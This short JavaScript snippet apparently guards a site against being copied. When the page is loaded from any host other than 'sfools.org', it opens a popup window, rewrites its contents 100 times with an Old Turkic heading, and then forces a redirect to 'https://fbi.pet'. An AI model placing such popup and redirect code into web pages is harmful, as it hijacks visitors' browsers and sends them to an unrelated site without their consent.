const html = `<h1>𐰊𐰀𐰙𐰚 𐰖𐰗𐰆</h1>`;

if (window.location.hostname !== "sfools.org") {
  const blyatWindow = window.open("", "_blank");

  if (blyatWindow) {
    for (let i = 0; i < 100; i++) {
      blyatWindow.document.open();
      blyatWindow.document.write(html);
      blyatWindow.document.close();
    }
  }

  window.location.href = "https://fbi.pet";
}
